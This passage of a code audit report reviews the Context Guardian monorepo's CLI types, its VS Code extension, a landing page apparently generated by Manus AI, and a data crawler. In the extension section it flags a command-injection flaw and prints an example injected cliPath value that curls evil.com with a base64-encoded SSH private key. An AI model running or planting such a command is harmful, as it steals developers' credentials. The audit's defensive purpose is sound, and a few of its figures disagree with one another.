   - `BestPractice` — has `type`, `title`, `description`, `category`, `severity`, `code_example?`, `source_url?` — **missing `id`, `library_id`, `library_name`, `version_range`** compared to API's `PlaybookRule`
   - `PlaybookResponse` — has `rules: BestPractice[]`, `generatedAt`, `cacheHit?`

**Key type mismatches between CLI types and other components**:

| CLI Type           | Compared To                    | Mismatch                                                                          |
| ------------------ | ------------------------------ | --------------------------------------------------------------------------------- |
| `BestPractice`     | API `PlaybookRule`             | Missing `id`, `library_id`, `library_name`, `version_range`                       |
| `BestPractice`     | playbook-gen `BestPractice`    | Missing `id`, `library_id`, `library_name`, `min_version`, `max_version`          |
| `ProjectPatterns`  | ast-analyzer `ProjectPatterns` | Missing `patterns` object (`usesHooks`, `usesAsync`, etc.) and `frameworks` array |
| `PlaybookResponse` | API response                   | Compatible shape but `rules` field uses stripped-down `BestPractice`              |

**Critical finding**: The CLI has its own duplicate `PlaybookGenerator` that is simpler and incompatible with `packages/playbook-generator/`. The CLI's version doesn't use Handlebars, doesn't support cursor-compatible mode, doesn't track metadata (ruleCount, criticalCount, etc.). If the plan is to use the `packages/playbook-generator/` package, this CLI-local generator should be removed.

### 7.6 Verdict

**Stub** — The CLI shell is well-structured (Commander, proper commands, config, logging, API client) but the core functionality is entirely TODOs. It does not import or call any of the other packages. It has its own duplicate types and its own duplicate playbook generator, both incompatible with the real packages. The API client is implemented but never used. This component needs to be essentially rewritten to integrate the dependency-parser, ast-analyzer, api-server/offline-fallback, and playbook-generator packages.

---

## 8. VS Code Extension

**Location**: `apps/vscode-extension/`
**Package**: `context-guardian@0.1.0` (package name, not `context-guardian-vscode`)

### 8.1 Dependencies (Install)

`npm install` — **Pass** (8 moderate vulnerabilities in eslint/@typescript-eslint devDependencies)

All dependencies are **devDependencies only** (no runtime deps — VS Code extensions use the VS Code API):

- `@types/vscode` ^1.80.0 — VS Code API types
- `@types/node` ^20.0.0
- `@typescript-eslint/eslint-plugin` ^6.0.0 — linting
- `@typescript-eslint/parser` ^6.0.0
- `@vscode/vsce` ^2.22.0 — extension packaging tool
- `eslint` ^8.50.0
- `typescript` ^5.0.0

The 8 moderate vulnerabilities are all in eslint/typescript-eslint dependency chains (dev-only, not shipped to users).

### 8.2 Build

`npm run compile` — **Pass** (tsc compiles cleanly)

`npm run lint` — **Pass** (1 warning: unused `stderr` variable in `cliRunner.ts:36`)

Output to `dist/`. Uses CommonJS module (same as CLI). `.vscodeignore` correctly excludes `src/`, `node_modules/`, `.map` files from the packaged extension.

### 8.3 Tests

**No tests exist.** No test files, no test directory, no test framework in devDependencies. The VS Code extension testing framework (`@vscode/test-electron` or `@vscode/test-cli`) is not installed.

### 8.4 Runtime

Cannot test without loading in VS Code (requires the VS Code Extension Host). The extension would activate on startup (`onStartupFinished` activation event) and:

1. Start file watchers on dependency files
2. Register 4 commands in the command palette
3. Show a welcome message on first install

However, it shells out to the `guardian` CLI (component 7) which is stubbed — so even if the extension runs, `sync` would produce no useful output.

### 8.5 Code Review

**Architecture**: 4 source files with clean separation of concerns.

1. **`extension.ts`** (189 lines) — Main entry point. Handles:
   - Activation: creates `CLIRunner`, `PlaybookManager`, `FileWatcher`
   - 4 commands: `sync`, `enable`, `disable`, `viewPlaybook`
   - Auto-sync: checks `contextGuardian.autoSync` config, starts file watcher if enabled
   - Welcome message: shown once on first install using `globalState`
   - Deactivation: disposes file watchers
   - **Issue**: `fileWatcher` is NOT added to `context.subscriptions`. If `deactivate()` isn't called (abnormal extension host termination), watchers leak.
   - **Issue**: `enableAutoSync`/`disableAutoSync` write to `ConfigurationTarget.Global` — toggling auto-sync for one project affects ALL workspaces globally. Should use `ConfigurationTarget.Workspace`.
   - **Issue**: Welcome message offers "Sync Now" but doesn't check if CLI is installed first — user clicks it, gets an error.

2. **`cliRunner.ts`** (97 lines) — Spawns CLI as child process via `exec()`:
   - Runs `guardian sync` (only sync, never `init`) in workspace directory
   - 30-second timeout
   - CLI path configurable via `contextGuardian.cliPath` setting (default: `'guardian'`)
   - Parses stdout for rule count and critical count using regex
   - Error handling for ENOENT (CLI not found), timeout
   - **CRITICAL SECURITY ISSUE**: Uses `exec()` (shell execution) instead of `execFile()`. The `cliPath` setting is interpolated directly into `execAsync(\`${cliPath} sync\`)` — a malicious `.vscode/settings.json` in a repo can inject arbitrary shell commands. Example: setting `cliPath` to `"guardian; curl https://evil.com/$(cat ~/.ssh/id_rsa | base64) #"`would exfiltrate SSH keys. **Must switch to`execFile()`\*\*.
   - **Issue**: `checkCLIInstalled()` runs `guardian --version` as a separate child process on every sync call. This means 2 exec calls per sync. Should be cached after first success.
   - **Issue**: `stderr` is destructured but never read — CLI warnings silently discarded.
   - **Issue**: Raw error messages from `exec()` (which include the full command text) are passed through to `vscode.window.showErrorMessage()`. Could expose sensitive info like tokens in the CLI path.
   - **Issue**: No explicit `maxBuffer` set — defaults to 1MB. Large CLI output causes silent failure.
   - **Issue**: Only runs `sync`, not `init`. If `.guardian.md` doesn't exist, sync will fail (CLI's sync checks for existing file). No fallback to `init`.
   - **Issue**: Progress notification has `cancellable: false` — user is stuck for up to 30s with no way to abort.

3. **`fileWatcher.ts`** (153 lines) — Watches dependency files for changes:
   - Watches: `package.json`, `requirements.txt`, `Cargo.toml`, `Gemfile`, `go.mod`
   - **Note**: Watches `Gemfile` and `go.mod` which the dependency-parser does NOT support (dep-parser only handles npm/pip/cargo). Forward-looking but the CLI can't handle these yet.
   - **Does NOT watch**: `pyproject.toml`, `pnpm-lock.yaml`, `yarn.lock`, lock files
   - 2-second debounce on file changes before triggering sync
   - Only watches first workspace folder (no multi-root workspace support)
   - **Issue**: Watches root-level files only (`package.json`, not `**/package.json`). Monorepo sub-packages are invisible.
   - **Issue**: No `onDidDelete` handler — deleting a dependency file doesn't trigger any action.
   - **Issue**: Shared debounce timer for all file types — if package.json changes and then Cargo.toml changes 1s later, only the Cargo.toml filename appears in the notification (cosmetic, sync still runs correctly).
   - **Issue**: Auto-sync file watcher bypasses the progress indicator that the manual sync command uses — inconsistent UX.

4. **`playbookManager.ts`** (116 lines) — Reads and refreshes `.guardian.md`:
   - `refresh()` — reopens the file if it's visible in an editor. However, `openTextDocument` returns VS Code's cached buffer — if the user has unsaved edits, the refresh won't show the new content from disk.
   - `getMetadata()` — parses metadata from playbook content using regex:
     - `**Rules**: N` → ruleCount
     - `**Critical Issues**: N` → criticalCount
     - `**Security Advisories**: N` → securityCount
     - `**Dependencies**: N` → libraryCount
     - `**Generated**: date` → generatedAt
     - Checks for `⚠️ Offline Mode` text → isOffline
   - **Critical**: These regex patterns match `packages/playbook-generator/`'s Handlebars template (`base.hbs` lines 21-24) but do NOT match the CLI's own `PlaybookGenerator` output (which uses `Generated: date` with `>` prefix, no metadata section). So if the CLI uses its own generator, the VS Code extension's metadata parsing will return all zeros.
   - **Issue**: `getMetadata()` is never called from anywhere in the codebase — dead code. It was clearly written for a status bar item that was never implemented.
   - **Issue**: `exists()` is never called from anywhere — dead code. Should be used by welcome message flow to check if playbook exists before offering "Sync Now".

**VS Code Configuration** (from `package.json` contributes):

- `contextGuardian.autoSync` — boolean, default true
- `contextGuardian.cliPath` — string, default `'guardian'`
- `contextGuardian.showNotifications` — boolean, default true

**Extension packaging & UX issues**:

- `media/` directory is empty — no icon file exists despite `"icon": "media/icon.png"` in package.json. `vsce package` would fail.
- `repository.url` points to `https://github.com/context-guardian/vscode-extension` — non-existent repo (this is a monorepo)
- `.vscode/launch.json` and `tasks.json` exist for debugging the extension in development
- `activationEvents: ["onStartupFinished"]` — extension activates on EVERY VS Code startup for ALL workspaces, even those with no dependency files or `.guardian.md`. Should use `workspaceContains:` patterns.
- No `when`/`enablement` clause on any command — all 4 commands appear in command palette for all projects, even those that don't use Context Guardian.
- No status bar item — extension is invisible in the UI. `getMetadata()` was clearly written to power a status bar indicator but was never wired up.
- No VS Code output channel — all logging goes to `console.log` (Extension Host DevTools), invisible to users. No way to diagnose issues.
- `.guardian.md` path is hardcoded in 4 separate locations (extension.ts:152, playbookManager.ts:18, :42, :82) with no shared constant.

### 8.6 Verdict

**Functional Shell with Critical Security Issue** — The code has good separation of concerns and the right building blocks (file watcher, CLI runner, playbook manager, metadata parsing). However, the deep review reveals a **command injection vulnerability** via the `cliPath` setting using `exec()` instead of `execFile()`, along with numerous UX gaps: no tests, no icon, no status bar, no output channel, dead code, global-scope config writes, and activation on every workspace. The extension only calls `sync` (never `init`) and depends on the CLI which is itself stubbed.

---

## 9. Landing Page

**Location**: `apps/landing/`
**Package**: `context-guardian-landing@1.0.0`

### 9.1 Dependencies (Install)

`pnpm install` — **Pass**. 246 packages. Uses pnpm with `packageManager` field locked to `pnpm@10.4.1`.

Massive dependency footprint for a single-page landing site:

- **Runtime**: React 19, Express 4, wouter (router), framer-motion, recharts, react-hook-form, zod, axios, 30+ Radix UI packages (full shadcn/ui install), sonner, cmdk, embla-carousel, react-day-picker, input-otp, react-resizable-panels, vaul, next-themes, streamdown
- **Dev**: Vite 7, Tailwind CSS 4, TypeScript 5.6, vitest, esbuild, prettier, `vite-plugin-manus-runtime`, `@builder.io/vite-plugin-jsx-loc`, `@types/google.maps`

The page only uses 5 UI component modules: Button, Card, Input, Sonner (toaster), Tooltip, plus lucide-react icons. ~80% of dependencies are unused.

### 9.2 Build

`pnpm run build` — **Pass** (Vite build + esbuild server bundle).

Output: 340 KB JS (gzipped: 104 KB), 118 KB CSS (gzipped: 18 KB). Build warnings:

- `%VITE_ANALYTICS_ENDPOINT%` and `%VITE_ANALYTICS_WEBSITE_ID%` not defined in env — broken analytics script tag
- Non-module script tag warning for analytics

`pnpm run check` (TypeScript) — **Pass**, no errors.

### 9.3 Tests

**No test files found.** `vitest` is in devDependencies but zero test files exist. Vitest exits with code 1.

### 9.4 Runtime

Static landing page only — no server-side logic beyond Express serving static files. No API routes, no database, no connection to any other Context Guardian component.

The waitlist form is **fake** — `handleWaitlistSubmit` uses `setTimeout(resolve, 1000)` to simulate an API call, then shows a success toast. No data is actually collected or sent anywhere.

### 9.5 Code Review

**Architecture**: React 19 SPA (Vite) with Express static server for production. Client-side routing via wouter. 2 pages: Home (landing) and NotFound (404). Dark theme via custom ThemeProvider.

**Generated by Manus AI** — multiple artifacts confirm this:

1. `vite-plugin-manus-runtime` in plugins
2. Custom `vitePluginManusDebugCollector` — 150-line Vite plugin that writes browser logs to `.manus-logs/` directory
3. `ManusDialog.tsx` — "Login with Manus" dialog component (dead code, never imported)
4. `Map.tsx` — Full Google Maps component with `VITE_FRONTEND_FORGE_API_KEY` and `forge.butterfly-effect.dev` API proxy (dead code, never imported)
5. `allowedHosts` includes 5 `*.manus.computer` domains
6. `@types/google.maps` in devDeps (only needed by dead Map component)
7. `@builder.io/vite-plugin-jsx-loc` — Manus-related Vite plugin
8. `patches/wouter@3.7.1.patch` — Patches wouter's Switch component to expose all route paths to `window.__WOUTER_ROUTES__` global (Manus introspection mechanism). Note: patch targets wouter@3.7.1 but dependency is `^3.3.5` — may not apply correctly.
9. `"add": "^2.0.6"` in devDependencies — accidental `pnpm add add` artifact

**Source files**:

- `server/index.ts` (33 lines) — Minimal Express static server. Serves `dist/public/` in production, handles SPA routing with catch-all `*` → `index.html`. No API routes.
- `client/src/App.tsx` (42 lines) — Root component with ErrorBoundary, ThemeProvider (dark default), TooltipProvider, Toaster, wouter Router.
- `client/src/pages/Home.tsx` (371 lines) — Full landing page: nav, hero with CLI demo mockup, "The Problem" section (3 cards), "Features" section (4 cards), waitlist form (fake), footer. Marketing stats ("10x faster onboarding", "80% fewer bugs") are unsubstantiated.
- `client/src/pages/NotFound.tsx` (50 lines) — 404 page with **hardcoded light-theme colors** (slate-\*, white, blue-600) instead of CSS variables. Does NOT respect the app's dark theme.
- `client/src/main.tsx` (5 lines) — Standard React 19 entry point.
- `client/src/contexts/ThemeContext.tsx` (64 lines) — Custom theme provider with `switchable` prop (currently disabled).
- `client/src/components/ErrorBoundary.tsx` (62 lines) — Class component error boundary with stack trace display.
- `client/src/lib/utils.ts` (6 lines) — Standard `cn()` helper (clsx + tailwind-merge).
- `shared/const.ts` (2 lines) — Exports `COOKIE_NAME` and `ONE_YEAR_MS` — dead code, not imported by any component (sidebar defines its own `SIDEBAR_COOKIE_NAME`).
- `client/src/const.ts` — Re-exports shared constants plus a dead `getLoginUrl()` function referencing undefined `VITE_OAUTH_PORTAL_URL` and `VITE_APP_ID` env vars. Never imported by anything.
- `client/src/components/ui/` — **53 shadcn/ui components** installed. Only 5 modules are used by the live app (Button, Card, Input, Sonner, Tooltip). The remaining 48 are dead code.
- `client/src/hooks/` — 3 hooks: `useComposition`, `useMobile`, `usePersistFn`. Only `usePersistFn` is imported (by dead Map component). All effectively unused.
- `index.html` — Analytics script tag references `%VITE_ANALYTICS_ENDPOINT%` and `%VITE_ANALYTICS_WEBSITE_ID%` env vars that are never set. Produces broken `<script>` tag in production.

**What's good**: Clean copy, well-structured sections, decent visual design, proper error boundary, copyright year correct (2026).

### 9.6 Verdict

**AI-Generated Shell** — The page was clearly generated by Manus AI and lightly customized with Context Guardian branding. The product description and feature sections are well-written and accurately describe the intended product. However: the waitlist form doesn't actually work (no backend), 53 UI components are installed but only 4 used, multiple Manus AI artifacts remain in the codebase (debug plugins, Map component, login dialog, allowed hosts), the 404 page ignores the dark theme, and there are no tests. The page has no runtime dependencies on any other Context Guardian component — it's a standalone marketing site.

---

## 10. Data Crawler

**Location**: `tools/data-crawler/`
**Package**: `@context-guardian/data-crawler@0.1.0`

### 10.1 Dependencies (Install)

`npm install` — **Pass**. 54 packages. Minimal dependency list: `axios`, `cheerio` (runtime), `typescript`, `tsx`, `@types/node` (dev).

### 10.2 Build

`npm run build` (tsc) — **Pass**, compiles to `dist/`.

### 10.3 Tests

**No tests.** No test framework installed. No test files.

### 10.4 Runtime

The crawler runs and produces `output/react-practices.sql` — however, the **generated SQL would fail against the actual database**:

1. `ON CONFLICT (name, ecosystem)` — DB unique constraint is on `name` alone, not `(name, ecosystem)`
2. `type` column in INSERT — doesn't exist in `best_practices` table
3. `min_version`/`max_version` columns — don't exist in DB
4. `version_range` (NOT NULL in DB) — not included in INSERT, so INSERT would fail
5. `category: 'hooks'` — fails DB CHECK constraint (valid values: security, performance, maintainability, best-practice, anti-pattern, deprecation)
6. Anti-patterns inserted into `best_practices` — DB has separate `anti_patterns` table
7. Security items inserted into `best_practices` — DB has separate `security_advisories` table

The pre-existing `output/react-practices.sql` (235 lines, 6 practices) would fail on every INSERT if run against the actual database. The ON CONFLICT failure cascades — the library row never gets created, so all practice INSERTs fail too (subquery returns NULL for `library_id`).

Note: `output/` is gitignored, so the SQL file is not committed to the repository — it only exists locally after running the crawler.

### 10.5 Code Review

**Architecture**: 4 source files — types, index barrel, ReactCrawler class, SQLFormatter class. Plus 1 example script and 1 pre-generated SQL output.

**The crawler doesn't actually crawl.** Every `extract*Practices()` method receives the cheerio `$` object but **never uses it**. All methods return hardcoded arrays of best practices:

- `extractHooksPractices($, url)` — ignores `$`, returns 2 hardcoded practices
- `extractMemoPractices($, url)` — ignores `$`, returns 1 hardcoded practice
- `extractSecurityPractices($, url)` — ignores `$`, returns 1 hardcoded practice
- `extractPurityPractices($, url)` — ignores `$`, returns 1 hardcoded practice
- `extractEffectPractices($, url)` — ignores `$`, returns 1 hardcoded practice

The page is fetched with `axios.get()` and loaded into cheerio, then cheerio is thrown away. This makes the "crawler" just a hardcoded data generator that happens to make HTTP requests.

**Source files**:

- `src/types.ts` (35 lines) — `BestPractice`, `CrawlResult`, `CrawlerConfig`. Note `BestPractice` has `min_version`/`max_version` while DB has `version_range`. `CrawlerConfig` is defined but never used anywhere.
- `src/index.ts` (3 lines) — Barrel export.
- `src/crawlers/react-crawler.ts` (278 lines) — `ReactCrawler` class. Fetches 5 React doc pages, calls extract methods per URL pattern, has 1-second polite delay. But all extraction returns hardcoded data. Contains `main()` function with `require.main === module` guard (CJS pattern in ESM context — works with tsx but inconsistent). Writes output file with `__dirname`-relative path.
- `src/formatters/sql-formatter.ts` (105 lines) — Generates INSERT statements via string concatenation. SQL escaping only handles single quotes and backslashes — incomplete for production use. Does not use parameterized queries. The INSERT column list doesn't match the actual database schema.
- `examples/crawl-and-format.ts` (78 lines) — Duplicate of the `main()` function in react-crawler.ts. Same functionality, same output.
- `output/react-practices.sql` (235 lines) — Pre-generated SQL file with 6 React practices. Would fail against actual DB.

**Additional issues**:

- `dist/` directory does not exist — `tsc` has never been run. `package.json` declares `"main": "dist/index.js"` but the package is not consumable as a module.
- `ecosystem`, `category`, and `severity` fields are not passed through `escape()` in the SQL formatter — additional injection surface.
- `README.md` references non-existent paths (`/home/ubuntu/phase-0_planning/...`) from a different machine.
- `CrawlResult.version` is populated (`'18.x'`) but never used by the SQL formatter.

**What's good**: Clean code structure, good type definitions, polite rate limiting (1s delay), proper error handling per page.

### 10.6 Verdict

**Broken** — The crawler concept is sound but the implementation is a prototype that doesn't actually work:

1. The "crawling" is fake — cheerio parses HTML but results are discarded, all data is hardcoded
2. The generated SQL doesn't match the actual database schema (wrong columns, wrong conflict targets, invalid categories)
3. Only React is supported (1 crawler, hardcoded for react.dev)
4. No tests
5. `CrawlerConfig` type is defined but unused — no configurable crawling
6. The `BestPractice` type uses `min_version`/`max_version` while the DB and API use `version_range` — another type mismatch in the system
